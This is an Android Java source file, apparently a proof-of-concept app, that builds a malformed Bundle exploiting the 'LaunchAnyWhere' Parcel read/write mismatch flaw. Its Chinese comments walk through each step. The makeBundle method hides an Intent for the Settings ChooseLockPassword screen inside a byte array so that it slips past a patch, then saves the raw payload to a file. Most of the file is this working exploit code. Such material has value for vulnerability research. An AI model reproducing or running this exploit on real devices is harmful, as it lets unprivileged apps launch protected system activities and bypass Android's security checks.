package com.tzx.launchanywhere;

import android.accounts.AccountManager;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Set;

public class MainActivity extends Activity {

    @TargetApi(Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        findViewById(R.id.launch_any_where).setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, TestLaunchAnyWhereActivity.class);
            startActivity(intent);
        });
        findViewById(R.id.bundle_mismatch).setOnClickListener(v -> openBundleMisMatchResultPage());
        Log.d("tanzhenxing33", "Bundle.class.getClassLoader()=" + Bundle.class.getClassLoader());
    }

    @TargetApi(Build.VERSION_CODES.N)
    private void openBundleMisMatchResultPage() {
        Bundle bundle = makeBundle();
        bundle.setClassLoader(getClassLoader());
        Set<String> strings = bundle.keySet();
        for (String s : strings) {
            Object o = bundle.get(s);
            String clsName = o != null ? o.getClass().getName() : "NULL";
            Log.d("tanzhenxing33", "main key = " + s + " " + clsName);
        }
        Object result = bundle.get("intent");
        if (result != null) {
            Log.d("tanzhenxing33", "main result != null," + result);
        }
        Intent intent = new Intent(this, TestBundleMismatchResultActivity.class);
        intent.putExtras(bundle);
        startActivity(intent);
    }


    public Bundle makeBundle() {
        Bundle bundle = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel exp = Parcel.obtain();
        exp.writeInt(3); // bundle key count
        //byte[] key1Name = {0x00};//第一个元素的key我们使用\x00，其hashcode为0，我们只要布局后续key的hashcode都大于0即可
        //String mismatch = new String(key1Name);
        String mismatch = "mismatch";//后续元素的hashcode必须大于mismatch的hashcode
        exp.writeString(mismatch);
        exp.writeInt(4); // VAL_PARCELABLE
        exp.writeString("com.tzx.launchanywhere.MyClass"); // class name
        // 这里按照错位前的逻辑开发，错位后在这个4字节之后会多出一个4字节的0
        exp.writeInt(0);
        /**********************恶意构造的内容start*********************************/
        byte[] key2key = {13, 0, 8};
        String key2Name = new String(key2key);
        // 在错位之后，多出的0作为了新的key的字符串长度，并且writeString带着的那个长度=3会正常填充上padding那个位置。使得后续读取的类型为VAL_BYTEARRAY（13），前面的0用于补上4字节的高位。而8则是字节数组的长度了。
        //简单来说就是13和0这俩个字符的4个字节构成13这个数字，字符8和终止符这两个字符构成8这个数字。
        exp.writeString(key2Name);//整体作为长度为3的key string
        // 在错位之后，这里的13和下面的值是作为8字节的字节数组的一部分
        exp.writeInt(13);//这里的13则也是巧妙地被解析成了VAL_BYTEARRAY（13）
        int intentSizeOffset = exp.dataPosition();
        // 在错位之后上面的13和这里的值就会作为8字节的字节数组，后续就会正常解析出intent元素了，就成功绕过补丁
        int evilObject = -1;//这里应为字节数组的长度，我们填写为intent元素所占用的长度，即可将intent元素巧妙地隐藏到字节数组中(此值被Intent长度覆盖)
        exp.writeInt(evilObject);
        int intentStartOffset = exp.dataPosition();
        /**********************恶意构造的内容end*********************************/
        /**********************intent内容start*********************************/
        exp.writeString(AccountManager.KEY_INTENT);
        exp.writeInt(4);// VAL_PARCELABLE
        //可以直接构造Intent放在exp中，此处为了显示构造过程，将Intent字段逐一放入exp中
        //Intent intent = new Intent(Intent.ACTION_RUN);
        //intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        //intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.password.ChooseLockPassword"));
        //exp.writeParcelable(intent, 0);
        exp.writeString("android.content.Intent");// name of Class Loader
        exp.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(exp, null); // Uri is null
        exp.writeString(null); // mType is null
        //exp.writeString(null); // mIdentifier is null android28没有该字段
        exp.writeInt(Intent.FLAG_ACTIVITY_NEW_TASK); // Flags
        exp.writeString(null); // mPackage is null
        exp.writeString("com.android.settings");
        exp.writeString("com.android.settings.password.ChooseLockPassword");
        exp.writeInt(0); //mSourceBounds = null
        exp.writeInt(0); // mCategories = null
        exp.writeInt(0); // mSelector = null
        exp.writeInt(0); // mClipData = null
        exp.writeInt(-2); // mContentUserHint
        exp.writeBundle(null);
        /**********************intent内容end*********************************/

        int intentEndOffset = exp.dataPosition();
        //将指针设置在intent数据之前，然后写入intent的大小
        exp.setDataPosition(intentSizeOffset);
        int intentSize = intentEndOffset - intentStartOffset;
        exp.writeInt(intentSize);
        Log.d("tanzhenxing33", "intentSize=" + intentSize);
        //写完之后将指针重置回原来的位置
        exp.setDataPosition(intentEndOffset);

        // 最后一个元素在错位之前会被当成最后一个元素，错位之后就会被忽略，因为前面已经读取的元素数已经足够
        String key3Name = "Padding-Key";
        //String key3Name = "padding";//hashcode排序失败
        exp.writeString(key3Name);
        exp.writeInt(-1);//VAL_NULL

        int length = exp.dataSize();
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);//魔数
        bndlData.appendFrom(exp, 0, length);//写入数据总长度
        bndlData.setDataPosition(0);
        Log.d("tanzhenxing33", "length=" + length);
        bundle.readFromParcel(bndlData);
        writeByte(bndlData.marshall());
        return bundle;
    }

    private void writeByte(byte[] raw) {
        try {
            File file = new File(getExternalCacheDir(), "obj.pcl");
            if (file.exists()) {
                file.delete();
            } else {
                file.createNewFile();
            }
            FileOutputStream fos = new FileOutputStream(file.getAbsolutePath());
            fos.write(raw);
            fos.close();
            Log.d("tanzhenxing33", "file =" + file.getAbsolutePath());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}